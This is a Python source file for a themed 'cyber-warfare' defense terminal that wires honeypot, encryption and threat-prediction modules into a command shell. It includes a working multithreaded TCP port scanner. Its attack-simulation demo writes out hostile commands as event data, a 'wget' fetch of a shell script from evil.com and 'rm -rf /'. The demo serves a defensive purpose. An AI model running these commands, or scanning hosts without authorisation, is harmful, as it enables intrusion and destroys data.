"""
╔══════════════════════════════════════════════════════════════════╗
║  Q-VOID OS TERMINAL v3.0 — Sovereign Cyber-Warfare Shell         ║
║  Rich terminal with boot animation, real-time status, and        ║
║  commands for every subsystem.                                   ║
╚══════════════════════════════════════════════════════════════════╝
"""
import os, sys, time, socket, threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from core.qvoid_core import EventBus, ForensicLogger, ModuleRegistry, QVOID_VERSION, CODENAME

# ── Module Imports (graceful degradation) ──────────────────────
def _try_import(module_path, class_name):
    try:
        mod = __import__(module_path, fromlist=[class_name])
        return getattr(mod, class_name)
    except Exception:
        return None

PolymorphEngine = _try_import("polymorphic.polymorph_engine", "PolymorphEngine")
SolipsismTrap = _try_import("trap.illusion_shell", "SolipsismTrap")
HiveMindDaemon = _try_import("hivemind.hivemind_daemon", "HiveMindDaemon")
GhostFileSystem = _try_import("ghostfs.ghost_fs", "GhostFileSystem")
QCryptEngine = _try_import("qcrypt.qcrypt_engine", "QCryptEngine")
PrecogEngine = _try_import("precog.precog_engine", "PrecogEngine")
QPMManager = _try_import("qpm.qpm_cli", "QPMManager")
DigitalForge = _try_import("forge.digital_forge", "DigitalForge")
HeuristicOracle = _try_import("oracle.heuristic_oracle", "HeuristicOracle")
MCPRouter = _try_import("mcp.mcp_router", "MCPRouter")
RAGEngine = _try_import("rag.rag_engine", "RAGEngine")
DNAEncryptor = _try_import("dna.dna_encryptor", "DNAEncryptor")
QVoidController = _try_import("controller.qvoid_controller", "QVoidController")
ThreatPipeline = _try_import("core.threat_pipeline", "ThreatPipeline")
LLMAdapter = _try_import("llm.llm_adapter", "LLMAdapter")

try:
    from rust_core.engine import get_engine_status as rust_status
except Exception:
    rust_status = lambda: {"rust_compiled": False, "engine": "Unavailable"}

# ── Rich Import ────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

console = Console() if RICH_AVAILABLE else None

def rprint(*args, **kwargs):
    if console:
        console.print(*args, **kwargs)
    else:
        print(*[str(a) for a in args])

# ── Boot Animation ─────────────────────────────────────────────
BANNER = r"""
[bold cyan]
   ██████╗       ██╗   ██╗ ██████╗ ██╗██████╗      ██████╗ ███████╗
  ██╔═══██╗      ██║   ██║██╔═══██╗██║██╔══██╗    ██╔═══██╗██╔════╝
  ██║   ██║█████╗██║   ██║██║   ██║██║██║  ██║    ██║   ██║███████╗
  ██║▄▄ ██║╚════╝╚██╗ ██╔╝██║   ██║██║██║  ██║    ██║   ██║╚════██║
  ╚██████╔╝       ╚████╔╝ ╚██████╔╝██║██████╔╝    ╚██████╔╝███████║
   ╚══▀▀═╝        ╚═══╝   ╚═════╝ ╚═╝╚═════╝      ╚═════╝ ╚══════╝
[/bold cyan]
[bold red]  ████████████████████████████████████████████████████████████████[/bold red]
[dim]  SOVEREIGN CYBER-WARFARE OPERATING SYSTEM[/dim]
"""

def boot_sequence():
    if not RICH_AVAILABLE:
        print("=" * 60)
        print(f"  Q-VOID OS v{QVOID_VERSION} — {CODENAME}")
        print("  SOVEREIGN CYBER-WARFARE OPERATING SYSTEM")
        print("=" * 60)
        return

    console.clear()
    rprint(BANNER)
    rprint(f"  [bold white]v{QVOID_VERSION}[/bold white] [dim]|[/dim] [bold yellow]{CODENAME}[/bold yellow]\n")

    boot_steps = [
        ("Initializing Forensic Logger", "blockchain-chained audit trail"),
        ("Loading Event Bus", "pub/sub backbone online"),
        ("Activating Polymorphic Shell", "moving-target defense armed"),
        ("Deploying Solipsism Trap", "honeypot environment ready"),
        ("Connecting Hive Mind", "P2P intelligence grid online"),
        ("Mounting Ghost File System", "steganographic layer active"),
        ("Initializing QCrypt 2.0++", "post-classical encryption ready"),
        ("Training Precog Engine", "AI threat prediction loaded"),
        ("Starting Heuristic Oracle", "Advanced Heuristic search engine active"),
        ("Loading MCP Router", "model routing initialized"),
        ("Connecting RAG Engine", "incident knowledge base online"),
        ("Checking Rust Core", rust_status()["engine"]),
    ]

    with Progress(SpinnerColumn(), TextColumn("[bold green]{task.description}"),
                  console=console) as progress:
        for step_name, detail in boot_steps:
            task = progress.add_task(description=f"{step_name}...", total=1)
            time.sleep(0.15)
            progress.update(task, completed=1, description=f"[green]✓[/green] {step_name} [dim]({detail})[/dim]")

    rprint("\n  [bold green]█ SYSTEM ONLINE[/bold green] [dim]— All modules operational[/dim]\n")
    rprint("  [dim]Type[/dim] [bold]help[/bold] [dim]for commands.[/dim]\n")

# ── Shell Class ────────────────────────────────────────────────
class QVoidShell:
    def __init__(self):
        self.logger = ForensicLogger()
        self.bus = EventBus(self.logger)
        self.registry = ModuleRegistry(self.bus)

        # Initialize subsystems
        self.polymorph = PolymorphEngine(self.bus) if PolymorphEngine else None
        self.trap = SolipsismTrap(self.bus) if SolipsismTrap else None
        self.hive = HiveMindDaemon(self.bus, port=9999) if HiveMindDaemon else None
        self.ghostfs = GhostFileSystem(self.bus) if GhostFileSystem else None
        self.qcrypt = QCryptEngine(self.bus) if QCryptEngine else None
        self.precog = PrecogEngine(self.bus) if PrecogEngine else None
        self.qpm = QPMManager(self.bus) if QPMManager else None
        self.forge = DigitalForge(self.bus) if DigitalForge else None
        self.oracle = HeuristicOracle(self.bus) if HeuristicOracle else None
        self.mcp = MCPRouter(self.bus) if MCPRouter else None
        self.rag = RAGEngine(self.bus) if RAGEngine else None
        self.dna = DNAEncryptor(self.bus) if DNAEncryptor else None
        self.controller = QVoidController(self.bus) if QVoidController else None
        self.llm_adapter = LLMAdapter() if LLMAdapter else None
        if self.precog and self.mcp and self.rag and self.llm_adapter and ThreatPipeline:
            self.threat_pipeline = ThreatPipeline(self.precog, self.mcp, self.rag, self.llm_adapter, self.bus)
        else:
            self.threat_pipeline = None

        # Start polymorphic engine
        if self.polymorph:
            self.polymorph.start()

    def run(self):
        boot_sequence()
        while True:
            try:
                prompt = "[bold red]Q-VOID[/bold red] [bold white]>[/bold white] " if RICH_AVAILABLE else "Q-VOID > "
                if RICH_AVAILABLE:
                    cmd = console.input(prompt).strip()
                else:
                    cmd = input("Q-VOID > ").strip()
                if not cmd:
                    continue
                self._dispatch(cmd)
            except (EOFError, KeyboardInterrupt):
                rprint("\n[dim]Shutting down Q-Void OS...[/dim]")
                if self.polymorph:
                    self.polymorph.stop()
                break

    def _dispatch(self, raw: str):
        parts = raw.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        commands = {
            "help": self._cmd_help, "scan": self._cmd_scan, "encrypt": self._cmd_encrypt,
            "decrypt": self._cmd_decrypt, "ghost": self._cmd_ghost, "trap": self._cmd_trap,
            "hive": self._cmd_hive, "precog": self._cmd_precog, "polymorph": self._cmd_polymorph,
            "forge": self._cmd_forge, "oracle": self._cmd_oracle, "mcp": self._cmd_mcp,
            "rag": self._cmd_rag, "dna": self._cmd_dna, "qpm": self._cmd_qpm,
            "status": self._cmd_status, "audit": self._cmd_audit, "exit": self._cmd_exit,
            "quit": self._cmd_exit, "clear": self._cmd_clear, "version": self._cmd_version,
            "dashboard": self._cmd_dashboard, "demo": self._cmd_demo, "analyze": self._cmd_analyze,
        }
        handler = commands.get(cmd)
        if handler:
            handler(args)
        else:
            rprint(f"[red]Unknown command:[/red] {cmd}. Type [bold]help[/bold] for commands.")

    # ── Command Implementations ─────────────────────────────────

    def _cmd_help(self, args):
        if RICH_AVAILABLE:
            t = Table(title="Q-VOID OS Commands", box=box.ROUNDED, border_style="cyan")
            t.add_column("Command", style="bold green")
            t.add_column("Description")
            cmds = [
                ("scan <host>", "TCP port scan target host"),
                ("encrypt <text>", "Encrypt text with QCrypt 2.0++"),
                ("decrypt", "Decrypt last encrypted envelope"),
                ("ghost <list|store|unlock|lock>", "Ghost File System operations"),
                ("trap <status|interactive>", "Solipsism trap management"),
                ("hive <status|peers>", "Hive Mind P2P network"),
                ("precog <signal>", "AI attack vector prediction"),
                ("polymorph <status|mutate>", "Polymorphic shell control"),
                ("forge <create|list|destroy> [args]", "Digital Forge VM management"),
                ("oracle <scan|search> <data>", "Heuristic Oracle analysis"),
                ("mcp <analyze> <payload>", "MCP model routing"),
                ("rag <query>", "RAG incident knowledge query"),
                ("dna <encode|decode> <text>", "DNA steganographic encoding"),
                ("qpm <install|remove|list|search> [pkg]", "Package manager"),
                ("status", "System-wide status summary"),
                ("dashboard", "Interactive Cyber Defense Live Dashboard"),
                ("demo", "Run 'Attack Timeline Replay' demo"),
                ("analyze <signal>", "Full agentic threat pipeline analysis"),
                ("audit", "Forensic chain integrity audit"),
                ("version", "Show version info"),
                ("clear", "Clear terminal"),
                ("exit", "Shutdown Q-Void OS"),
            ]
            for c, d in cmds:
                t.add_row(c, d)
            rprint(t)
        else:
            print("Commands: help, scan, encrypt, decrypt, ghost, trap, hive, precog,")
            print("          polymorph, forge, oracle, mcp, rag, dna, qpm, status, dashboard, demo, analyze, audit, exit")

    def _cmd_scan(self, args):
        target = args.strip() or "127.0.0.1"
        rprint(f"[bold]Scanning {target}...[/bold]")
        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                        1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        open_ports = []
        svc_names = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
                     135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
                     995:"POP3S",1433:"MSSQL",1521:"Oracle",3306:"MySQL",3389:"RDP",
                     5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
        def check_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                s.close()
            except Exception:
                pass
        threads = [threading.Thread(target=check_port, args=(p,)) for p in COMMON_PORTS]
        for t in threads: t.start()
        for t in threads: t.join()
        open_ports.sort()
        if RICH_AVAILABLE:
            t = Table(title=f"Scan Results: {target}", box=box.SIMPLE)
            t.add_column("Port", style="cyan")
            t.add_column("Service", style="green")
            t.add_column("Status", style="bold yellow")
            for p in open_ports:
                t.add_row(str(p), svc_names.get(p, "Unknown"), "OPEN")
            rprint(t)
        else:
            for p in open_ports:
                print(f"  {p}/tcp OPEN ({svc_names.get(p, 'Unknown')})")
        rprint(f"[dim]{len(open_ports)} open port(s) found out of {len(COMMON_PORTS)} scanned.[/dim]")
        # Precog analysis
        if self.precog and open_ports:
            signal = " ".join([f"port {p} open {svc_names.get(p,'').lower()}" for p in open_ports])
            results = self.precog.predict_vector(signal)
            rprint(f"\n[bold yellow]⚡ Precog Prediction:[/bold yellow] {results[0]['vector']} [dim]({results[0]['confidence']}% confidence)[/dim]")

    def _cmd_analyze(self, args):
        if not self.threat_pipeline:
            rprint("[red]Threat Pipeline not fully available (requires Precog, MCP, RAG, and LLM)[/red]"); return
        signal = args.strip() or "port 445 open smb windows with weird payload"
        rprint(f"[bold]Analyzing Threat Signal:[/bold] {signal}")
        import asyncio
        try:
            assessment = asyncio.run(self.threat_pipeline.analyze_threat(signal))
            rprint(f"Threat: [bold red]{assessment.threat_type}[/bold red] ({assessment.confidence}%)")
            rprint(f"Recommended Actions:")
            for a in assessment.recommended_actions:
                rprint(f"  • {a}")
            if assessment.counter_exploit_code:
                rprint(f"\n[cyan]Counter Exploit Code:[/cyan]\n{assessment.counter_exploit_code}")
        except Exception as e:
            rprint(f"[red]Error analyzing threat:[/red] {e}")

    def _cmd_encrypt(self, args):
        if not self.qcrypt:
            rprint("[red]QCrypt module not available[/red]"); return
        text = args.strip() or "Q-Void classified data"
        self._last_envelope = self.qcrypt.encrypt(text.encode(), label="shell")
        rprint(f"[green]✓ Encrypted[/green] [dim]({len(text)} bytes → {self._last_envelope['algorithm']})[/dim]")
        rprint(f"  Key ID: [cyan]{self._last_envelope['key_id']}[/cyan]")
        rprint(f"  Ciphertext: [dim]{self._last_envelope['ciphertext'][:64]}...[/dim]")

    def _cmd_decrypt(self, args):
        if not self.qcrypt:
            rprint("[red]QCrypt module not available[/red]"); return
        if not hasattr(self, '_last_envelope'):
            rprint("[yellow]No encrypted data. Use 'encrypt <text>' first.[/yellow]"); return
        plaintext = self.qcrypt.decrypt(self._last_envelope)
        rprint(f"[green]✓ Decrypted:[/green] {plaintext.decode()}")

    def _cmd_ghost(self, args):
        if not self.ghostfs:
            rprint("[red]GhostFS module not available[/red]"); return
        parts = args.split(maxsplit=1)
        sub = parts[0] if parts else "status"
        if sub == "unlock":
            phrase = parts[1] if len(parts) > 1 else "default_phrase"
            self.ghostfs.unlock(phrase)
            rprint(f"[green]✓ GFS unlocked[/green] ({len(self.ghostfs.list_hidden())} hidden files)")
        elif sub == "lock":
            self.ghostfs.lock()
            rprint("[yellow]✓ GFS locked[/yellow]")
        elif sub == "list":
            vis = self.ghostfs.list_visible()
            hid = self.ghostfs.list_hidden()
            rprint(f"[bold]Visible:[/bold] {len(vis)} files  [bold]Hidden:[/bold] {'LOCKED' if not self.ghostfs._unlocked else f'{len(hid)} files'}")
        elif sub == "store":
            name = parts[1] if len(parts) > 1 else "secret.txt"
            self.ghostfs.store_hidden(name, b"Classified data", tags=["secret"])
            rprint(f"[green]✓ Stored '{name}' in hidden layer[/green]")
        else:
            s = self.ghostfs.get_status()
            rprint(f"GFS: {'🔓 UNLOCKED' if s['unlocked'] else '🔒 LOCKED'} | Visible: {s['visible_files']} | Hidden: {s['hidden_files']}")

    def _cmd_trap(self, args):
        if not self.trap:
            rprint("[red]Trap module not available[/red]"); return
        if args.strip() == "interactive":
            self.trap.run_interactive()
        else:
            s = self.trap.get_status()
            rprint(f"Trap: Sessions={s['total_sessions']} | Active={s['active_sessions']} | Listening={s['listening']}")

    def _cmd_hive(self, args):
        if not self.hive:
            rprint("[red]HiveMind module not available[/red]"); return
        s = self.hive.get_status()
        rprint(f"Hive: Node=[cyan]{s['node_id']}[/cyan] | Peers={s['known_peers']} | Threats={s['threats_in_db']}")

    def _cmd_precog(self, args):
        if not self.precog:
            rprint("[red]Precog module not available[/red]"); return
        signal = args.strip() or "port 445 open smb windows"
        results = self.precog.predict_vector(signal, top_n=5)
        if RICH_AVAILABLE:
            t = Table(title="Precog Prediction", box=box.SIMPLE)
            t.add_column("Rank", style="dim")
            t.add_column("Attack Vector", style="bold red")
            t.add_column("Confidence", style="cyan")
            for i, r in enumerate(results, 1):
                t.add_row(str(i), r["vector"], f"{r['confidence']}%")
            rprint(t)
        else:
            for i, r in enumerate(results, 1):
                print(f"  {i}. {r['vector']} ({r['confidence']}%)")

    def _cmd_polymorph(self, args):
        if not self.polymorph:
            rprint("[red]Polymorphic module not available[/red]"); return
        if args.strip() == "mutate":
            s = self.polymorph.emergency_mutate("MANUAL")
            rprint(f"[green]✓ Emergency mutation[/green] → Epoch {s['epoch']} | DNA: [cyan]{s['dna_signature']}[/cyan]")
        else:
            s = self.polymorph.get_status()
            rprint(f"Polymorph: Epoch={s['epoch']} | DNA=[cyan]{s['dna_signature']}[/cyan] | Running={s['running']}")

    def _cmd_forge(self, args):
        if not self.forge:
            rprint("[red]Forge module not available[/red]"); return
        parts = args.split(maxsplit=1)
        sub = parts[0] if parts else "list"
        if sub == "create":
            name = parts[1] if len(parts) > 1 else "sandbox-1"
            r = self.forge.create_vm(name, "malware-sandbox")
            rprint(f"[green]✓ VM created:[/green] {r.get('vm_id')} ({r.get('os')})")
        elif sub == "list":
            vms = self.forge.list_vms()
            rprint(f"VMs: {len(vms)} | Templates: {len(self.forge.list_templates())}")
            for v in vms:
                rprint(f"  {v['vm_id']} | {v['name']} | {v['status']} | {v['os']}")
        elif sub == "destroy":
            vm_id = parts[1].strip() if len(parts) > 1 else ""
            r = self.forge.destroy_vm(vm_id)
            rprint(f"[yellow]{r.get('status')}[/yellow]")
        elif sub == "templates":
            for t in self.forge.list_templates():
                rprint(f"  [cyan]{t['name']}[/cyan]: {t['description']}")
        else:
            s = self.forge.get_status()
            rprint(f"Forge: VMs={s['total_vms']} | Running={s['running']} | Templates={s['templates']}")

    def _cmd_oracle(self, args):
        if not self.oracle:
            rprint("[red]Oracle module not available[/red]"); return
        parts = args.split(maxsplit=1)
        sub = parts[0] if parts else "status"
        if sub == "scan" and len(parts) > 1:
            data = parts[1].encode()
            r = self.oracle.analyze_data(data, "shell-scan")
            rprint(f"Entropy: [cyan]{r['entropy']}[/cyan] | Class: {r['classification']} | Verdict: [bold]{r['verdict']}[/bold] (score: {r['anomaly_score']})")
        elif sub == "search" and len(parts) > 1:
            items = [f"log_{i}" for i in range(100)]
            items[42] = parts[1]
            r = self.oracle.pattern_search(items, parts[1])
            rprint(f"AdvancedSearch: {'FOUND' if r['found'] else 'NOT FOUND'} in {r['iterations']} iters ({r['advanced_speedup']})")
        else:
            s = self.oracle.get_status()
            rprint(f"Oracle: Scans={s['scans_performed']} | Observations={s['observations']}")

    def _cmd_mcp(self, args):
        if not self.mcp:
            rprint("[red]MCP module not available[/red]"); return
        parts = args.split(maxsplit=1)
        if parts and parts[0] == "analyze" and len(parts) > 1:
            r = self.mcp.route(parts[1])
            rprint(f"Routed to: [bold]{r['model']}[/bold] | Threat: {r['threat']} | Confidence: [cyan]{r['confidence']}%[/cyan] | Is Threat: {r['is_threat']}")
        else:
            s = self.mcp.get_status()
            rprint(f"MCP: Models={s['models']} | Rules={s['routing_rules']} | Routed={s['total_routed']}")

    def _cmd_rag(self, args):
        if not self.rag:
            rprint("[red]RAG module not available[/red]"); return
        if args.strip():
            r = self.rag.query(args.strip())
            rprint(f"[bold]Recommended:[/bold] {r['recommended_response']}")
            rprint(f"[dim]Confidence: {r['confidence']}% | Based on {len(r['evidence'])} past incidents[/dim]")
            for e in r['evidence'][:3]:
                rprint(f"  • {e['incident']}: {e['summary'][:80]}...")
        else:
            s = self.rag.get_status()
            rprint(f"RAG: {s['incidents_in_store']} incidents | Vocab: {s['vocab_size']} terms")

    def _cmd_dna(self, args):
        if not self.dna:
            rprint("[red]DNA module not available[/red]"); return
        parts = args.split(maxsplit=1)
        sub = parts[0] if parts else "status"
        if sub == "encode" and len(parts) > 1:
            strand = self.dna.encode_text(parts[1])
            rprint(f"[green]Strand:[/green] {strand[:80]}{'...' if len(strand)>80 else ''}")
            rprint(f"[dim]Length: {len(strand)} nucleotides[/dim]")
        elif sub == "decode" and len(parts) > 1:
            try:
                text = self.dna.decode_text(parts[1])
                rprint(f"[green]Decoded:[/green] {text}")
            except ValueError as e:
                rprint(f"[red]Error:[/red] {e}")
        elif sub == "stats" and len(parts) > 1:
            s = self.dna.stats(parts[1])
            rprint(f"GC: {s['gc_content']}% | Length: {s['length']} | Freqs: {s['frequencies']}")

    def _cmd_qpm(self, args):
        if not self.qpm:
            rprint("[red]QPM module not available[/red]"); return
        parts = args.split(maxsplit=1)
        sub = parts[0] if parts else "list"
        if sub == "install" and len(parts) > 1:
            r = self.qpm.install(parts[1].strip())
            rprint(f"[green]{r['status']}[/green]: {r.get('package','')} {r.get('version', r.get('message',''))}")
        elif sub == "remove" and len(parts) > 1:
            r = self.qpm.remove(parts[1].strip())
            rprint(f"[yellow]{r['status']}[/yellow]: {r.get('package', r.get('message',''))}")
        elif sub == "search":
            query = parts[1].strip() if len(parts) > 1 else ""
            results = self.qpm.search(query)
            for r in results:
                icon = "✅" if r["installed"] else "  "
                rprint(f"  {icon} [cyan]{r['name']}[/cyan] v{r['version']} [{r['category']}] — {r['description']}")
        elif sub == "audit":
            r = self.qpm.audit()
            rprint(f"Audit: {r['status']} | {r['total_packages']} packages | {len(r['issues'])} issues")
        else:
            installed = self.qpm.list_installed()
            rprint(f"Installed: {len(installed)} packages")
            for p in installed:
                rprint(f"  [cyan]{p['name']}[/cyan] v{p['version']} [{p['category']}]")

    def _cmd_status(self, args):
        if RICH_AVAILABLE:
            t = Table(title="Q-VOID OS System Status", box=box.DOUBLE_EDGE, border_style="cyan")
            t.add_column("Module", style="bold")
            t.add_column("Status", style="green")
            t.add_column("Details", style="dim")
            modules = [
                ("Polymorphic Shell", self.polymorph, lambda m: f"Epoch {m.get_status()['epoch']} | DNA: {m.get_dna()[:12]}..."),
                ("Solipsism Trap", self.trap, lambda m: f"Sessions: {m.get_status()['total_sessions']}"),
                ("Hive Mind", self.hive, lambda m: f"Node: {m.node_id} | Peers: {m.get_status()['known_peers']}"),
                ("Ghost FS", self.ghostfs, lambda m: f"{'🔓 UNLOCKED' if m.get_status()['unlocked'] else '🔒 LOCKED'}"),
                ("QCrypt 2.0++", self.qcrypt, lambda m: f"Key: {m.get_status()['active_key_id']}"),
                ("Precog Engine", self.precog, lambda m: f"{'TRAINED' if m.is_trained else 'OFFLINE'} | {len(m.TRAINING_DATA) if hasattr(m,'TRAINING_DATA') else '?'} vectors"),
                ("QPM", self.qpm, lambda m: f"{len(m.list_installed())} installed"),
                ("Digital Forge", self.forge, lambda m: f"{m.get_status()['total_vms']} VMs"),
                ("Heuristic Oracle", self.oracle, lambda m: f"{m.get_status()['scans_performed']} scans"),
                ("MCP Router", self.mcp, lambda m: f"{m.get_status()['models']} models"),
                ("RAG Engine", self.rag, lambda m: f"{m.get_status()['incidents_in_store']} incidents"),
                ("Threat Pipeline", self.threat_pipeline, lambda m: "Agentic Analysis Online"),
                ("DNA Encoder", self.dna, lambda m: "Online"),
                ("Rust Core", None, lambda m: rust_status()["engine"]),
            ]
            for name, mod, detail_fn in modules:
                if mod:
                    try:
                        t.add_row(name, "[green]✅ ONLINE[/green]", detail_fn(mod))
                    except Exception as e:
                        t.add_row(name, "[yellow]⚠ ERROR[/yellow]", str(e)[:50])
                elif name == "Rust Core":
                    rs = rust_status()
                    t.add_row(name, "[green]✅[/green]" if rs["rust_compiled"] else "[yellow]⚠ Fallback[/yellow]", rs["engine"])
                else:
                    t.add_row(name, "[red]❌ OFFLINE[/red]", "Module not loaded")
            rprint(t)
            # Event bus stats
            stats = self.bus.get_stats()
            rprint(f"\n[dim]Events: {stats['total_events_published']} published | {stats['subscriber_count']} subscribers | {stats['dead_letters']} dead letters[/dim]")
        else:
            print("=== Q-VOID OS System Status ===")
            print(f"  Polymorph: {'ON' if self.polymorph else 'OFF'}")
            print(f"  Events: {self.bus.get_stats()['total_events_published']} published")

    def _cmd_audit(self, args):
        ok = self.logger.verify_chain()
        rprint(f"Forensic Chain: {'[green]✓ INTACT[/green]' if ok else '[red]✗ TAMPERED[/red]'}")
        rprint(f"  Entries: {self.logger._event_count}")
        rprint(f"  Log: {self.logger.log_file}")

    def _cmd_dashboard(self, args):
        if not RICH_AVAILABLE:
            rprint("[red]Rich library required for dashboard.[/red]"); return
        try:
            from terminal_ui.dashboard import CyberDefenseDashboard
            dash = CyberDefenseDashboard(self)
            dash.run()
        except ImportError as e:
            rprint(f"[red]Failed to load dashboard:[/red] {e}")

    def _cmd_demo(self, args):
        rprint("\n[bold yellow]🔥 Initiating Attack Simulation Demo in 2 seconds...[/bold yellow]")
        rprint("[bold cyan]Type 'dashboard' NOW to watch the adaptive engine respond![/bold cyan]\n")
        
        def simulate_attack():
            time.sleep(2)
            self.bus.publish("PRECOG_PREDICTION", {"signal": "nmap -sV -p 22,80,443", "top_vector": "WEB_EXPLOIT[Log4Shell/CVE-2021-44228]"})
            time.sleep(3)
            self.bus.publish("THREAT_DETECTED", {"type": "SUSPICIOUS_COMMAND", "attacker_ip": "192.168.1.55", "command": "wget http://evil.com/shell.sh"})
            time.sleep(1)
            self.bus.publish("TRAP_ENGAGED", {"session_id": "demo-001", "attacker_ip": "192.168.1.55"})
            time.sleep(4)
            self.bus.publish("POLYMORPH_MUTATION", {"epoch": 42, "trigger": "threat", "dna_signature": "a1b2c3d4e5f6"})
            time.sleep(2)
            self.bus.publish("THREAT_DETECTED", {"type": "DESTRUCTIVE_COMMAND", "attacker_ip": "192.168.1.55", "command": "rm -rf /"})
            time.sleep(1)
            self.bus.publish("COUNTERMEASURE_DEPLOYED", {"session_id": "demo-001", "suspicion_score": 100})
            time.sleep(1)
            self.bus.publish("PRECOG_LIVE_INTEL_UPDATED", {"new_threats": 5})

        threading.Thread(target=simulate_attack, daemon=True).start()

    def _cmd_version(self, args):
        rprint(f"[bold]Q-VOID OS[/bold] v{QVOID_VERSION} ({CODENAME})")
        rprint(f"  Rust Core: {rust_status()['engine']}")
        rprint(f"  Python: {sys.version.split()[0]}")

    def _cmd_clear(self, args):
        if console:
            console.clear()
        else:
            os.system("cls" if sys.platform == "win32" else "clear")

    def _cmd_exit(self, args):
        rprint("[dim]Shutting down Q-Void OS...[/dim]")
        if self.polymorph:
            self.polymorph.stop()
        raise SystemExit(0)


if __name__ == "__main__":
    shell = QVoidShell()
    shell.run()
